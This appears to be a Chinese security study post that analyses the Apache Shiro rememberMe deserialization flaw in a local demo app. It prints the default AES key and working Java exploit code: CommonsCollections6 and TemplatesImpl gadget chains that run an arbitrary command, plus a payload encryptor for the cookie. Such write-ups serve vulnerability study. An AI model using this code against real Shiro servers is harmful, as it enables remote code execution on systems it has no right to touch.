# shiro1ACC6

# 简介

本篇分为上下两部分

* 介绍shiro,调试分析shiro出现反序列化漏洞的根本原因
* 通过自己修改CC链来攻击shiro应用


# 环境搭建

p牛写的一个最简单的shiro登录应用，没有适用任何框架，十分简单。

[https://github.com/phith0n/JavaThings/tree/master/shirodemo](https://github.com/phith0n/JavaThings/tree/master/shirodemo)

我们配置一下自己的maven，配置一下tomcat发布就行。

用root/secret登录，返回一个remeberMe就说明搭建ok了

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405200324-qnipuyf.png)


# shiro反序列化漏洞原理剖析

从简介中我们得知，是Cookie中的remberMe字段出的问题，shiro会将它解密之后反序列化。

所以要针对remberMe来进行分析

## 生成remberMe

shiro生成remberMe的地方在`org.apache.shiro.mgt.DefaultSecutiryManager`的login方法，可以打上断点调试。

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405225302-71rolmh.png)


截获断点，当登陆成功的时候，会进入下面的`createSubject`，创建一个新的Subject

> Subject: 为`认证主体`。应用代码直接交互的对象是Subject,Subject代表了当前的用户。包含`Principals`和`Credentials`两个信息。
>

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405230135-k2h55d5.png)


步入下面的onSuccessfulLogin()方法

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405230700-ilvuwi4.png)

这里的token为我们浏览器传入的数据，其中remberMe为true，代表开启remberMe

subject是传进来的loggin


步入rmm.onSuccessfulLogin方法

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405230944-hofzlf3.png)


继续跟进，最终发现序列化accountPrincipals对象的地方在这里：

`org.apache.shiro.mgt.AbstractRememberMeManager` 的convertPrincipalsToBytes方法中

下面也能看到完整方法栈，如果想调试可以参考。

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405231222-d49u3to.png)


然后在这里base64编码然后设置为cookie

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405231629-6wc4wmc.png)

## 解析remberMe

用刚刚生成的正常的remberMe来调试反序列化，直接锁定`AbstractRememberMeManager`这个类在解密的地方打上断点，（不知道前面的过程但是肯定要解密反序列化吧）


发包的时候要删除原来的JSSESSID，建立一个新会话

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405233813-vkelq2w.png)

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405233904-io898k8.png)

哦吼，截获了断点，获得了方法栈，往上面追溯到`DefaultSecutiryManager`进行调试


跟进getRemberedIdentity方法

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405234603-s7io7wr.png)

此时我们的remberMe在这个里面，可以自行展开看，截图不够了![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405234858-u1tfgzy.png)


跟进getRememberedIdentity方法：

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405235039-pxih2yy.png)

这里应该是要反序列化获得Principals对象了


跟进方法，发现这里先通过一个方法来获得字节数组，然后再反序列化

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405235134-8e2icfj.png)


先看getRemberedSerializedIdentity方法

这个方法中base64解码了我们传入的remberMe字段，转化为字节数组然后返回

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405235336-ym3alnt.png)

convertBytesToPrincipals方法先进行解密，然后反序列化

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220405235525-7gdo2js.png)<br />

（中间跳过了几个步骤）在这里readObject

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406000506-u1b6prl.png)

## aes key

其实这个过程中可以发现一个很关键的问题，就是aes的密钥，如果密钥错了是不能够反序列化的

所以只有知道密钥才能够触发remberMe带来的反序列化漏洞，而在Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==。官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key。所以高于这个版本的地方这个点就不能使用了。


# ACC6打shiro

在刚刚的项目中也有一个shiroAttack项目，可以当作参考使用，但是这里我们还是自己建一个项目来生成payload

因为项目中有commons collections依赖，所以直接生成一个cc6来打

## Transformer数组型

CommonsCollections6.java

> 其实参考p牛的写法，之后自己写的时候也可以效仿他getPayload的写法。
>

```java
package com.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class CommonsCollections6 {
    public byte[] getPayload(String command) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { command }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        return barr.toByteArray();
    }
}
```


对payload进行加密然后base64输出，这里的aes加密器使用shiro自带的`org.apache.shiro.crypto.AesCipherService`

```java
package com.payload;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.util.Base64;

public class Generate1 {
    public static void main(String[] args) throws Exception {
        byte[] payload = new CommonsCollections6().getPayload("calc.exe");
        AesCipherService encoder = new AesCipherService();
        //使用shiro默认的key对payload进行加密
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource text = encoder.encrypt(payload, key);
        System.out.println(text.toString());

    }
}
```

然后设置为remberMe字段打进去

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406004852-gh6iook.png)

随后tomcat报错，没有弹出计算器

> 怎么根据报错调试：[https://bbs.csdn.net/topics/390369450](https://bbs.csdn.net/topics/390369450)
>

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406002311-ineikiu.png)

最后面可以看到报错信息`Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context,`

然后下面其实可以快速到达报错的类，也就是这里抛出的异常，打断点调试

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406002428-3tlpqyr.png)


> 其实这里已经进入了刚刚分析的反序列化过程，看方法栈就能知道
>
> ![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406002835-lql098z.png)
>


这个类继承了ObjectInputStream，并且重写了resolveClass方法

resolveClass方法是反序列化的时候通过字符串类名来查找类的方法，可以看到forName也是我们熟悉的，它将根据类名来返回这个类的class类类型。

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406003002-uli0789.png)

> 这里和没重写之前的方法的差别在于：
>
> 一个使用原生类Class，这个我们都熟悉
>
> 另一个用的是ClassUtils，这个类位于org.apache.shiro.util包下
>
> ![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406003325-9et2oi5.png)
>
> 我们看一下org.apache.shiro.util.ClassUtils的forName方法：
>
> 调试多次之后发现前面的HashMap，TiedEntryMap，ChainTransformer都能返回clazz，但是到这个Transformer类就找不到了
>
> ![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406003756-dpwbj29.png)
>

导致报错的地方就在这里：

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406004253-n0kqmme.png)

你可以清晰的看到类名前面是`[L`，`[L`是一个JVM的标记，说明实际上这是一个数组，即Transformer[]

reference：[https://blog.zsxsoft.com/post/35](https://blog.zsxsoft.com/post/35)

> 如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。
>

## TemplatesImpl字节码型

因为它强行用的是shiro包自带的ClassUtil,所以要避免出现数组,可以参考思路:https://www.anquanke.com/post/id/192619

因此我们可以考虑用TemplatesImpl字节码来打

> 这个时候就考验对cc的学习程度了,因为上面我们发现了问题,就要自己通过CC中各种组件重新构造去解决这个问题
>
> 而重新构造意味着要自己编写payload
>
> 这里虽然p牛写好了,但是还是尽量自己去把整个exp从0到1写出来比较有体会.
>


### 如何加载TemplatesImpl

```java
TemplatesImpl obj = new TemplatesImpl();
setFieldValue(obj, "_bytecodes", new byte[][] {"/*bytes*/"});
setFieldValue(obj, "_name", "HelloTemplatesImpl");
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
obj.newTransformer();
```

### LazyMap.get()

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406015040-mbzwtgq.png)

以往我们是这样触发TemplatesImpl的:

```java
Transformer[] transformers = new Transformer[]{
  new ConstantTransformer(obj),
  new InvokerTransformer("newTransformer", null, null)
};
```

但这里transform是可以传入一个参数key的,结合InvokeTransformer的transform方法:

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406015821-whcvobi.png)

那我们可以直接传入,不用第一个`new ConstantTransformer(obj),`存在了,因为我们也知道这个类的作用就是:![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406015901-0cmid5c.png)


所以就是这么个构造思路:

```java
TiedMapEntry.getValue()
	LazyMap.get(key)
		InvokeTransformer.transform()
```


就是直接把那个类作为参数传给InvokeTransformer就行了,不用通过transform方法递归.

### 构造exp

构造令人头大....总之一步一步来


#### 解决TemplatesImpl的部分

我直接参照ysoserial的createTemplateImpl方法写

可以看到ysoserial的痕迹还是很足的,但是不影响它的可读性和好用性

```java
    public static TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        //修改Neo类，插入command，创建恶意字节码，此处参考ysoserial
        ClassPool pool = ClassPool.getDefault();
        CtClass  clazz = pool.getCtClass(Neo.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        CtClass superC = pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();

        setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
```

这里我把原来ysoserial它修改字节码的基类自己重写了一个Neo类

```java
package com.payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;

public class Neo extends AbstractTranslet implements Serializable {

    private static final long serialVersionUID = -5971610431559700674L;


    public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}


    @Override
    public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
}
```


#### 构造攻击链

然后写getPayload方法

也可以参照ysoserial写

```java
    public byte[] getPayload(String command) throws Exception {
        TemplatesImpl templatesImpl = createTemplatesImpl(command);

        //getClass方法占位，之后换成newTransformer
        Transformer transformer = new InvokerTransformer("getClass", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, templatesImpl);

        Map finalMap = new HashMap();
        finalMap.put(tme, "valuevalue");

        outerMap.clear();
        setFieldValue(transformer, "iMethodName", "newTransformer");
      
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(finalMap);
        oos.close();

        return barr.toByteArray();
    }
```

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406022837-asevmym.png)

# 参考

[http://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B](http://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B)